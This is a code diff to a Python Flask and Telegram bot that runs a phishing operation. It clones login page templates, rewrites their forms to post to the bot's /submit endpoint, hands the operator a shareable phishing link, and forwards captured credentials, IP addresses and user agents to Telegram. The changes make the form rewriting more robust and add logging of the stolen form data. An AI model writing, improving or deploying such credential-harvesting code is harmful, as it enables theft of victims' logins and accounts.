@@ -100,11 +100,25 @@ def capture_creds(user_id):
     else:  # GET method
         creds = request.args.to_dict()
 
+    # Get template name
+    template_name = "Unknown"
+    template_info_path = f"phished_pages/{user_id}/template_info.txt"
+    if os.path.exists(template_info_path):
+        with open(template_info_path, 'r') as f:
+            template_name = f.read().strip()
+
+    # Add template name if it's not already there
+    if 'template' not in creds:
+        creds['template'] = template_name
+
     # Add timestamp and IP for tracking
     creds['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     creds['ip'] = request.remote_addr
     creds['user_agent'] = request.headers.get('User-Agent', 'Unknown')
     creds['method'] = request.method
+
+    # Log all received data for debugging
+    logger.info(f"Form data received: {creds}")
 
     # Format credentials as text for Telegram message
     msg = "\n".join(f"{k}: {v}" for k, v in creds.items())
@@ -259,7 +273,7 @@ def handle_template_selection(message):
             with open(f"{output_path}/template_info.txt", 'w') as f:
                 f.write(template)
 
-            # Modify the HTML to include the user_id in form action and preserve method
+            # Modify the HTML to include the user_id in form action and preserve form fields
             if modify_html_form(f"{output_path}/index.html", user_id, template):
                 phishing_url = f"https://notafish-1.onrender.com/phish/{user_id}"
                 bot.send_message(message.chat.id, f"✅ Done!\nSend this link:\n{phishing_url}")
@@ -271,58 +285,103 @@ def handle_template_selection(message):
         bot.send_message(message.chat.id, f"❌ Template '{template}' not found.")
 
 
-# Updated function to modify HTML file to keep the form method and add user_id to action
+# Updated function to modify HTML file - this is the key fix
 def modify_html_form(html_path, user_id, template_name):
     try:
         with open(html_path, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
 
+        # First, extract all form elements to preserve them
+        input_pattern = re.compile(r'<input.*?name=["\'](.*?)["\'].*?>', re.IGNORECASE | re.DOTALL)
+        input_matches = input_pattern.findall(content)
+        logger.info(f"Found form fields: {input_matches}")
+
+        # Also check for select elements
+        select_pattern = re.compile(r'<select.*?name=["\'](.*?)["\'].*?>', re.IGNORECASE | re.DOTALL)
+        select_matches = select_pattern.findall(content)
+        input_matches.extend(select_matches)
+
         # More robust form detection and modification
-        # First, try to find forms with method and action
-        form_pattern = re.compile(r'<form.*?method=["\'](.*?)["\'].*?action=["\'](.*?)["\']', re.IGNORECASE | re.DOTALL)
+        form_pattern = re.compile(r'<form.*?action=["\'](.*?)["\'].*?method=["\'](.*?)["\']', re.IGNORECASE | re.DOTALL)
         form_matches = form_pattern.findall(content)
 
         if form_matches:
             # Replace form action but keep the original method
-            for method, action in form_matches:
+            for action, method in form_matches:
                 # Keep original method but replace action
                 content = content.replace(
-                    f'method="{method}" action="{action}"',
-                    f'method="{method}" action="/submit/{user_id}"'
+                    f'action="{action}" method="{method}"',
+                    f'action="/submit/{user_id}" method="{method}"'
                 )
                 content = content.replace(
-                    f"method='{method}' action='{action}'",
-                    f"method='{method}' action='/submit/{user_id}'"
+                    f"action='{action}' method='{method}'",
+                    f"action='/submit/{user_id}' method='{method}'"
                 )
         else:
-            # Look for forms with just method
-            method_pattern = re.compile(r'<form.*?method=["\'](.*?)["\']', re.IGNORECASE)
-            method_matches = method_pattern.findall(content)
+            # Try other form pattern
+            form_pattern = re.compile(r'<form.*?method=["\'](.*?)["\'].*?action=["\'](.*?)["\']',
+                                      re.IGNORECASE | re.DOTALL)
+            form_matches = form_pattern.findall(content)
 
-            if method_matches:
-                for method in method_matches:
+            if form_matches:
+                # Replace form action but keep the original method
+                for method, action in form_matches:
+                    # Keep original method but replace action
                     content = content.replace(
-                        f'method="{method}"',
+                        f'method="{method}" action="{action}"',
                         f'method="{method}" action="/submit/{user_id}"'
                     )
                     content = content.replace(
-                        f"method='{method}'",
+                        f"method='{method}' action='{action}'",
                         f"method='{method}' action='/submit/{user_id}'"
                     )
             else:
-                # If no form with method found, look for any form
-                form_pattern = re.compile(r'<form', re.IGNORECASE)
-                if form_pattern.search(content):
-                    content = form_pattern.sub(f'<form method="post" action="/submit/{user_id}"', content)
-                else:
-                    logger.warning(f"No form found in {html_path}")
-                    return False
+                # Look for forms with just method
+                method_pattern = re.compile(r'<form.*?method=["\'](.*?)["\']', re.IGNORECASE)
+                method_matches = method_pattern.findall(content)
 
-        # Add a hidden field to track which template was used
+                if method_matches:
+                    for method in method_matches:
+                        content = content.replace(
+                            f'method="{method}"',
+                            f'method="{method}" action="/submit/{user_id}"'
+                        )
+                        content = content.replace(
+                            f"method='{method}'",
+                            f"method='{method}' action='/submit/{user_id}'"
+                        )
+                else:
+                    # If no form with method found, look for forms with just action
+                    action_pattern = re.compile(r'<form.*?action=["\'](.*?)["\']', re.IGNORECASE)
+                    action_matches = action_pattern.findall(content)
+
+                    if action_matches:
+                        for action in action_matches:
+                            content = content.replace(
+                                f'action="{action}"',
+                                f'action="/submit/{user_id}" method="post"'
+                            )
+                            content = content.replace(
+                                f"action='{action}'",
+                                f"action='/submit/{user_id}' method='post'"
+                            )
+                    else:
+                        # If no form with action found, look for any form
+                        form_pattern = re.compile(r'<form', re.IGNORECASE)
+                        if form_pattern.search(content):
+                            content = form_pattern.sub(f'<form method="post" action="/submit/{user_id}"', content)
+                        else:
+                            logger.warning(f"No form found in {html_path}")
+                            return False
+
+        # Add a hidden field to track which template was used, if form has an end tag
         form_end_pattern = re.compile(r'</form>', re.IGNORECASE)
         if form_end_pattern.search(content):
             content = form_end_pattern.sub(f'<input type="hidden" name="template" value="{template_name}"></form>',
                                            content)
+
+        # Debug - print the file content after modifications
+        logger.info(f"Modified HTML content: {content[:500]}...")
 
         with open(html_path, 'w', encoding='utf-8') as f:
             f.write(content)
@@ -386,7 +445,7 @@ if __name__ == '__main__':
     bot_polling_thread.start()
 
     # Get port from environment variable (for Render compatibility)
-    port = int(os.environ.get("PORT", 5000))
+    port = int(os.environ.get("PORT", 6000))
 
     # Start Flask web server
     app.run(host='0.0.0.0', port=port)
